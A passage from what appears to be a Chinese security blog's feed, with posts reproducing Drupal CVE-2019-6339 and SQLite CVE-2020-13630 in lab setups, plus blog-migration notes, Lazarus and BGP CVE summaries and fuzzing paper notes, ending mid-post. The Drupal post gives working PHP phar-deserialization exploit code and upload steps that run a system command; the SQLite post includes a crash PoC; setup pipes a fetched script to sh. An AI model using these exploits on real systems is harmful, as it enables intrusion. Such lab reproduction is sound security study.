class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">FnStream</span>&#123;</span><br><span class="line"><span class="title">public</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $methods</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"><span class="comment">// Create the functions on the class</span></span><br><span class="line"><span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="string">&#x27;_fn_&#x27;</span> . $name&#125; = $fn;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_fn_close)) &#123;</span><br><span class="line">call_user_func(<span class="keyword">$this</span>-&gt;_fn_close);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">HandlerStack</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">handler</span> = &quot;<span class="title">uname</span> -<span class="title">a</span>&quot;;</span><br><span class="line"><span class="keyword">private</span> $stack = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&quot;passthru&quot;</span>));</span><br><span class="line"><span class="keyword">private</span> $cached = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">httphandlestack</span> = <span class="title">new</span> <span class="title">GuzzleHttp</span>\<span class="title">HandlerStack</span>();</span><br><span class="line"></span><br><span class="line">$methods = <span class="keyword">array</span>(<span class="string">&quot;close&quot;</span>=&gt;<span class="keyword">array</span>($httphandlestack, <span class="string">&quot;resolve&quot;</span>));</span><br><span class="line">$Stream = <span class="keyword">new</span> GuzzleHttp\Psr7\FnStream($methods);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;poc1.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;poc1.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($Stream);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-6-PHP-执行系统命令的函数"><a href="#1-6-PHP-执行系统命令的函数" class="headerlink" title="1.6 PHP 执行系统命令的函数"></a>1.6 PHP 执行系统命令的函数</h4><ul><li><code>system()</code> 输出并返回最后一行shell结果。</li><li><code>exec() </code>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</li><li><code>passthru()</code> 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</li></ul><h3 id="2-复现过程："><a href="#2-复现过程：" class="headerlink" title="2. 复现过程："></a>2. 复现过程：</h3><h4 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a>2.1 环境搭建</h4><p>使用vulhub现有的漏洞镜像来搭建环境，在服务器上安装docker和docker-compose，使用git克隆vulhub仓库到服务器，进入CVE-2019-6339的目录，使用docke-compose编译、启动环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line">pip install docker-compose</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/drupal/CVE-2019-6339</span><br><span class="line">docker-compose build <span class="comment"># 编译</span></span><br><span class="line">docker-compose up -d <span class="comment"># 启动环境</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122022908914.png" alt="image-20201122022908914"></p><p>目录下的docker-compose.yml中设置的端口是8080，因为是在公网的服务器嘛，我稍微改了一下。</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122022649645.png" alt="image-20201122022649645"></p><p>然后在浏览器访问<code>ip:port</code>就能看见drupal的安装界面了，一路配置下去，注册管理员，成功进入管理员的信息配置页面之后我们就可以上传我们通过EXP生成的头像文件了。</p><h4 id="2-2-exp生成"><a href="#2-2-exp生成" class="headerlink" title="2.2 exp生成"></a>2.2 exp生成</h4><p>由于上传有文件格式验证，所以我们在phar的头部加了个GIF的头，生成的整个exp如下：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122023710966.png" alt="image-20201122023710966"></p><h4 id="2-3-执行过程"><a href="#2-3-执行过程" class="headerlink" title="2.3 执行过程"></a>2.3 执行过程</h4><p>修改生成的poc1.phar文件名为test6.gif，上传：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122024147236.png" alt="image-20201122024147236"></p><p>然后访问<code>admin/config/media/file-system</code>，修改临时目录为<code>phar://./sites/default/files/pictures/2020-11/test6.gif</code>，保存设置，页面上返回了”uname -a”执行后的结果：</p><p><img src="/2020/11/19/CVE-2019-6339%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20201122024452506.png" alt="image-20201122024452506"></p><p>由于这是一个只有管理员才能访问的页面，因此这个漏洞虽然评分很高，但是影响有所减小。</p><p>参考链接：</p><ul><li><a href="http://www.y1nhui.com/2019/12/07/cve-2019-6339%E5%A4%8D%E7%8E%B0/">http://www.y1nhui.com/2019/12/07/cve-2019-6339%E5%A4%8D%E7%8E%B0/</a></li><li><a href="https://cloud.tencent.com/developer/article/1355389">https://cloud.tencent.com/developer/article/1355389</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6339">https://nvd.nist.gov/vuln/detail/CVE-2019-6339</a></li><li><a href="https://www.toolnb.com/tools/phpserialize.html">https://www.toolnb.com/tools/phpserialize.html</a></li><li><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li><li><a href="https://www.cnblogs.com/Byqiyou/p/10187672.html">https://www.cnblogs.com/Byqiyou/p/10187672.html</a></li><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Drupal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blog迁移小记</title>
      <link href="2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>1、首先把原来电脑上的blog文件夹全部复制过来。</strong></p><p><strong>2、在新电脑上安装Git、Node.js, 安装完Node.js 后安装hexo。</strong></p><p><code>npm i hexo </code></p><p>下得太慢了，换了个淘宝的镜像。</p><p><code>npm config set registry https://registry.npm.taobao.org</code></p><p><code>npm info underscore</code> 查看信息。</p><p><strong>3、然后尝试<code>hexo g -d</code>发现报错了，可能是原来的node模块版本和现在的node版本不兼容，重新安装一下一些包：</strong></p><p><code>npm i hexo-server,hexo-deployer-git --save</code></p><p><strong>4、再次尝试，发现ssh私钥的问题不对，啊全忘了。</strong></p><p>GitBash生成ssh key：<code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code></p><p>检查是否可以：<code>ssh -v git@github.com</code></p><p>添加id_rsa:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash</span><br><span class="line">ssh-add ~&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure><p>将id_rsa同目录下的id_rsa.pub内容复制添加到GitHub上的设置里去：</p><p><img src="/2020/11/18/blog%E8%BF%81%E7%A7%BB%E5%B0%8F%E8%AE%B0/image-20201118214926296.png" alt="image-20201118214926296"></p><p>验证：</p><p><code>ssh -T git@github.com</code>, 成功！</p><p><strong>5、版本相关问题</strong></p><p>如果不是强迫症的话，建议不要用最新的node14，血的教训，用你原来的版本就行，不然会报很多你无法想象的错误或警告。</p><p>虽然现在部署的过程还是会有烦人的警告，不过还是要说一句，<strong>又可以继续愉快地写博客了，用新电脑。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> ssh公私钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-13630分析</title>
      <link href="2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/"/>
      <url>2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-13630分析文档"><a href="#CVE-2020-13630分析文档" class="headerlink" title="CVE-2020-13630分析文档"></a>CVE-2020-13630分析文档</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><ul><li>在sqlite3的fts3扩展中，fts3EvalNextRow中存在一个Use-After-Free漏洞，与Snippet函数有关。</li></ul><p>fts3扩展是sqlite为了支持快速全文查询而加入的一个扩展，其官方文档里面列出了使用常规查询方法和fts查询方法的耗时对比，如下图：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031032907904.png" alt="image-20201031032907904"></p><p>而Snippet函数是用来支持fts3扩展全文查询的一个辅助函数，返回的是用<code>MATCH</code>关键字匹配的内容的代码片段(ftsSegment)，另外还有两个类似的函数<code>offsets,matchinfo</code>,这三个辅助函数只在使用FTS表的全文索引的SELECT语句中有用。如果在使用“rowid查询”或“线性扫描”策略的SELECT中使用，那么代码段和偏移量都返回一个空字符串，而matchinfo函数返回一个blob值，大小为零字节。所以使用Snippet函数的一个例子可以这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create virtual table t0 use fts3();</span><br><span class="line">insert into t0 values (&quot;abcd&quot;);</span><br><span class="line">select snippet(t0) from t0 where t0 MATCH &#39;cd&#39;;</span><br></pre></td></tr></table></figure><p>而在漏洞发现者给出的poc中也看到了相似的查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS t0_content;</span><br><span class="line">DROP TABLE IF EXISTS t0_messageize;</span><br><span class="line">DROP TABLE IF EXISTS t0_segdir;</span><br><span class="line">DROP TABLE IF EXISTS t0_segments;</span><br><span class="line">DROP TABLE IF EXISTS t0_stat;</span><br><span class="line">DROP TABLE IF EXISTS t0;</span><br><span class="line">CREATE VIRTUAL TABLE t0 USING fts3(col0 INTEGER PRIMARY KEY,col1 VARCHAR(8),col2 BINARY,col3 BINARY);</span><br><span class="line">INSERT INTO t0 VALUES (1, &#39;1234&#39;,&#39;aaaa&#39;,&#39;bbbb&#39;);</span><br><span class="line">SELECT snippet(t0 )  FROM t0 WHERE t0 MATCH x&#39;0a4d4d4d4d320a4f52d70a310a310a4e4541520a0a31f6ce0a4f520a0a310a310a310a4f520a75fc2a242424&#39; ;</span><br></pre></td></tr></table></figure><p>POC中16进制匹配的值的ASCII表示如下（将换行符0x0a替换成了空格0x20）：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031034434034.png" alt="image-20201031034434034"></p><p>这里虽然不知道是怎么个原理。但漏洞触发的调用过程可以分析如下：</p><p>在执行具有snippet函数的fts全文查询的时候，会调用<code>sqlite3Fts3SegReaderNew</code>函数来为将要匹配到的内容分配一个空间来存储，这个对象叫做<code>Fts3SegReader</code>:</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031074958842.png" alt="image-20201031074958842"></p><p>然后sqlite会调用<code>fts3BestSnippet</code>来寻找最合适匹配的Snippet片段，在<code>fts3BestSnippet</code>调用了<code>fts3SnippetFindPositions</code>，然后又调用了<code>sqlite3Fts3EvalPhrasePoslist</code>来寻找具体的位置，在<code>sqlite3Fts3EvalPhrasePoslist</code>中就调用了漏洞函数<code>fts3EvalNextRow</code>:</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031080108462.png" alt="image-20201031080108462"></p><p>fts3EvalNextRow中会根据传入参数的Fts3Expr.eType（pNear）来进行不同的处理，在处理eType为FTSQUERY_AND的时候，如果当前pNear的左右子节点都被推迟解析了（通过bDeferred判断）的话，则会判断当前是否已经到了结束的地方（bEof），如果当前节点的左右子节点有一个结束且当前节点为FTSQOERY_NEAR的话，则将其左右子节点的文档列表（doclist）内容置为0，这代表了这里就是结束的地方了，所以应该确保其左右子节点的bEof都置为1了，但是在SQLite的版本（0d69f76f0865f962）之前，没有做此处理，这就引发了后续的UAF漏洞：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031082052006.png" alt="image-20201031082052006"></p><p>查找到匹配的内容后就会调用<code>fts3SegReaderCursorFree</code>Free掉之前分配的<code>Fts3SegReader</code>对象。上面的搜寻过程会将近似匹配片段存到一个SnippetIter中，之后需要从这一个候选的片段中找到一个最佳的，会调用<code>fts3SnippetNextCandidate</code>进行迭代，在该函数里面会调用<code>fts3SnippetAdvance</code>继续遍历下一个Snippet：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031085050339.png" alt="image-20201031085050339"></p><p>然后在之前可能没有正确设置结束的地方的时候，fts3SnippetAdvance遍历会出现访问之前已经释放的地址的内容的情况，造成UAF漏洞：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031090735722.png" alt="image-20201031090735722"></p><h2 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h2><p>编译的SQLite版本：3.31.1</p><p>configure命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCC+=<span class="string">&quot;-DSQLITE_ENABLE_VFSTRACE -DSQLITE_ENABLE_STAT3 -DSQLITE_ENABLE_FTS4 -DSQLITE_ENABLE_FTS3 -DSQLITE_ENABLE_BATCH_ATOMIC_WRITE -DHAVE_READLINE -DSQLITE_ENABLE_FTS3_PARENTHESIS -DTHREADSAFE=0 -DSQLITE_ENABLE_DESERIALIZE -DSQLITE_ENABLE_DBSTAT_VTAB&quot;</span>  ../SQLite-3bfa9cc9/configure</span><br></pre></td></tr></table></figure><p>修改Makefile加上ASAN参数：<code>-fsanitize=address -fno-omit-frame-pointer</code></p><p>根据上面描述的，在sqlite3.c:176720（Malloc的地方）, sqlite3:178133（Free的地方）, sqlite3:181223（Use again的地方）处下断点，执行poc进行调试：</p><h3 id="1-Malloc"><a href="#1-Malloc" class="headerlink" title="1. Malloc"></a>1. Malloc</h3><p>首先会在Malloc处申请多个Fts3SegReader,每个大小为0x180:</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124107520.png" alt="image-20201031124107520"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124255316.png" alt="image-20201031124255316"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031124423282.png" alt="image-20201031124423282"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125125861.png" alt="image-20201031125125861"></p><p>一共有9个Fts3SegReader.</p><h3 id="2-Free"><a href="#2-Free" class="headerlink" title="2. Free"></a>2. Free</h3><p>分配，进行匹配完之后，一开始会Free掉最后分配的Fts3SegReader对象，然后把匹配到的值打印出来，最后再Free掉剩下的Fts3SegReader对象：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125414512.png" alt="image-20201031125414512"></p><h3 id="3-Use"><a href="#3-Use" class="headerlink" title="3. Use"></a>3. Use</h3><p>93ce是之前分配的Fts3SegReader里面的内容，属于0x6120000094c0这个对象里的内容：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031125830659.png" alt="image-20201031125830659"></p><p>查看该对象的内容：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140547018.png" alt="image-20201031140547018"></p><p>而这一部分属于Fts3SegReader的aDoclist。然后继续执行，发现这个地方的内容在不同的Fts3SegReader对象中的内容都一样：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031134531348.png" alt="image-20201031134531348"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031134551909.png" alt="image-20201031134551909"></p><p>都是<code>“\001\003\004\003\006\003\003”</code>。</p><p>继续执行，返回匹配到的值：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140233123.png" alt="image-20201031140233123"></p><p>最后Free剩下的Fts3SegReader：</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031140952530.png" alt="image-20201031140952530"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031141100982.png" alt="image-20201031141100982"></p><p>一直执行，没有发现ASAN检测出的错误。</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031141323083.png" alt="image-20201031141323083"></p><h2 id="确认的问题："><a href="#确认的问题：" class="headerlink" title="确认的问题："></a>确认的问题：</h2><h3 id="1-Chrome是否有独立的sqlite3文件？"><a href="#1-Chrome是否有独立的sqlite3文件？" class="headerlink" title="1. Chrome是否有独立的sqlite3文件？"></a>1. Chrome是否有独立的sqlite3文件？</h3><p>单从安装在Windows上的Chrome版本来说，其安装目录下并没有独立的sqlite3的独立文件，甚至连和有关sqlite3的相关文件都没有。</p><h3 id="2-FTS3扩展自行创建的信息表内容："><a href="#2-FTS3扩展自行创建的信息表内容：" class="headerlink" title="2. FTS3扩展自行创建的信息表内容："></a>2. FTS3扩展自行创建的信息表内容：</h3><p>这些表叫做“shadow table”，是真实的表，用于存储底层数据。</p><ul><li><strong>t0_content</strong>: 会根据创建的虚表的创建而声明，就是虚表的内容。</li></ul><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031142923543.png" alt="image-20201031142923543"></p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031142949495.png" alt="image-20201031142949495"></p><ul><li><strong>t0_segdir, t0_segments</strong>: 这两张表是用于存储全文索引的。从概念上讲，这个索引是一个查找表，它将每个词（word）映射到一组docid值，这些docid值对应于% content表中包含一个或多个词的记录。为了检索包含指定术语的所有文档，FTS模块查询该索引以确定包含该术语的记录的docid值集，然后从% content表检索所需的文档。</li></ul><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031143457857.png" alt="image-20201031143457857"></p><ul><li><strong>t0_stat, t0_docsize</strong>: 这两个表是使用FTS4创建虚表的时候才创建的表。</li></ul><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031143942190.png" alt="image-20201031143942190"></p><ul><li><strong>t0_messageize</strong>: 这个表也是没有查到，而且官方文档里面并没有说有这个表。</li></ul><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031144057813.png" alt="image-20201031144057813"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>整个PoC的调用流程弄清楚了，但是具体的PoC里的那段MATCH的值所代表的的内容是不清楚的，我把那部分加入到PoC中的INSERT语句中才会走到Use（sqlite3.c:178133）的地方。如果是原始的PoC的话，则不会走到这个地方。编译的时候也测试了sqlite3是加入了ASAN编译选项的，但实际执行PoC后确实没有反应。</p><p>参考链接：</p><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1080459#c5">https://bugs.chromium.org/p/chromium/issues/detail?id=1080459#c5</a>   漏洞报告者和Chrome开发者的讨论记录</li><li><a href="https://www.sqlite.org/fts3.html#introduction_to_fts3_and_fts4">https://www.sqlite.org/fts3.html#introduction_to_fts3_and_fts4</a>   sqlite的FTS3和FTS4的官方介绍文档</li><li><a href="https://sqlite.org/src/info/0d69f76f0865f962">https://sqlite.org/src/info/0d69f76f0865f962</a>            Patch的记录</li><li><a href="https://sqlite.org/forum/timeline?advm=0&amp;b=2020-10-21+01:58:20&amp;n=50&amp;nsm&amp;ss=v&amp;vfx&amp;y=f">https://sqlite.org/forum/timeline?advm=0&amp;b=2020-10-21+01:58:20&amp;n=50&amp;nsm&amp;ss=v&amp;vfx&amp;y=f</a>    SQLiteForm的timeline</li></ul><p>注：特意输错命令，sqlite3检测到memory leak错误。</p><p><img src="/2020/11/10/CVE-2020-13630%E5%88%86%E6%9E%90/image-20201031145922259.png" alt="image-20201031145922259"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazarus APT的一些报告链接</title>
      <link href="2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/"/>
      <url>2020/11/09/Lazarus-APT%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E5%91%8A%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p><a href="https://paper.seebug.org/1279/">https://paper.seebug.org/1279/</a>      卡巴斯基报告：Lazarus APT 组织的大型狩猎游戏<br><a href="https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/">https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/</a>  MATA卡巴斯基报告<br><a href="https://www.freebuf.com/sectool/244849.html">https://www.freebuf.com/sectool/244849.html</a>   上一条的翻译版本<br><a href="https://securelist.com/apt-trends-report-q2-2020/97937/">https://securelist.com/apt-trends-report-q2-2020/97937/</a>  卡巴斯基2020第二季度APT趋势报告<br><a href="https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A">https://us-cert.cisa.gov/ncas/analysis-reports/AR19-129A</a>      ELECTRICFISH工具分析报告（较新）<br><a href="https://www.anquanke.com/post/id/190189">https://www.anquanke.com/post/id/190189</a>      2019-11-04一个样本分析报告</p>]]></content>
      
      
      <categories>
          
          <category> Thought </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lazarus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BGP协议的几个CVE漏洞简述</title>
      <link href="2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/"/>
      <url>2020/11/09/BGP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%A0%E4%B8%AACVE%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="BGP协议的几个CVE漏洞简述"><a href="#BGP协议的几个CVE漏洞简述" class="headerlink" title="BGP协议的几个CVE漏洞简述"></a>BGP协议的几个CVE漏洞简述</h1><h2 id="1-CVE-2018-5381"><a href="#1-CVE-2018-5381" class="headerlink" title="1. CVE-2018-5381"></a>1. CVE-2018-5381</h2><p>Quagga的BGP守护进程（version1.2.3之前）在解析BGP的OPEN消息的“Capabilities”时会造成拒绝服务漏洞。漏洞定位于<code>bgp_packet.c:bgp_capability_msg_parse</code>函数，如果一个多协议的“Capabilities”没有一个可识别的<code>AFI/SAFI</code>的话则会进入死循环。</p><p>AFI/SAFI: 地址族信息和子地址族信息。</p><h2 id="2-CVE-2018-5378"><a href="#2-CVE-2018-5378" class="headerlink" title="2. CVE-2018-5378"></a>2. CVE-2018-5378</h2><p>如果属性长度无效，则版本1.2.3之前的Quagga BGP守护程序（bgpd）无法正确地对NOTIFY发送给Peers的数据进行边界检查。 来自bgpd进程的任意数据可能会通过网络发送到Peers，并且/或者bgpd可能会崩溃。</p><h2 id="3-CVE-2019-16519"><a href="#3-CVE-2019-16519" class="headerlink" title="3. CVE-2019-16519"></a>3. CVE-2019-16519</h2><p>BIRD Internet路由守护程序1.6.x到1.6.7和2.x到2.0.5都有基于堆栈的缓冲区溢出。 当检查输入消息的有效性时，BGP守护程序对RFC 8203管理性关闭通信消息的支持包括错误的逻辑表达式。 发送具有足够消息长度的关闭通信会导致在处理消息时发生四字节的溢出，其中两个溢出字节是攻击者控制的，两个是固定的。</p><h2 id="4-CVE-2017-15865"><a href="#4-CVE-2017-15865" class="headerlink" title="4. CVE-2017-15865"></a>4. CVE-2017-15865</h2><p>用于Cumulus Linux3.4.3之前和其他产品中的FRR 路由程序bgpd（2.0.2之前，3.0.2之前的3.x）存在一个漏洞，能使远程攻击者能够通过格式错误的BGP UPDATE数据包从连接的对等方获取敏感信息， 由于属性长度（即RN-690（CM-18492））处理不正确，它触发了多达数千个意外字节的传输。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BGP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CollAFL阅读笔记</title>
      <link href="2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CollAFL-Path-Sensitive-Fuzzing阅读笔记"><a href="#CollAFL-Path-Sensitive-Fuzzing阅读笔记" class="headerlink" title="CollAFL: Path Sensitive Fuzzing阅读笔记"></a>CollAFL: Path Sensitive Fuzzing阅读笔记</h1><h2 id="技术问题和挑战"><a href="#技术问题和挑战" class="headerlink" title="技术问题和挑战"></a>技术问题和挑战</h2><p>AFL采用的基于覆盖的模糊测试，采用粗略的覆盖率信息来实现高效的灰盒测试，将边缘点击计数存储在紧凑的位图中，这样的覆盖范围是不准确和不完整的。导致以下问题：</p><ul><li>path collisions：路径碰撞，无法发现引起new crashes的潜在路径。</li><li>阻止Fuzzer做更好的fuzz 策略。</li></ul><h2 id="提出的解决方案"><a href="#提出的解决方案" class="headerlink" title="提出的解决方案"></a>提出的解决方案</h2><ul><li>CollAFL: a coverage sensitive fuzzing solution.<ul><li>在保证low instrumentation的前提下，提供更精确的覆盖率信息</li><li>利用覆盖率信息实现了三种fuzz策略，更快地发现new path和bug</li></ul></li></ul><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>现有软件使用的基于覆盖的fuzz技术，用到的code coverage information的fuzzer很少（没有）：</p><ul><li>AFL：edge coverage information</li><li>AFLfast：further edge coverage information</li><li>VUzzer：block coverage information</li></ul><h3 id="覆盖范围不精确会导致什么"><a href="#覆盖范围不精确会导致什么" class="headerlink" title="覆盖范围不精确会导致什么"></a>覆盖范围不精确会导致什么</h3><ul><li>path collision：如果两个不同路径的hash是一致的，则会发生路径碰撞，后测试的那条路径就会被识别先前测试的那条路径中去，后面的这条路径及其相关路径就得不到相对应的测试。</li><li>fuzzing strategy：AFLfast优先选择训练路径低频的seeds，AFLgo优先选择接近于目标的seeds，这两者都需要精确的覆盖信息，不精确的覆盖范围会影响这种选择seeds的策略。</li></ul><h3 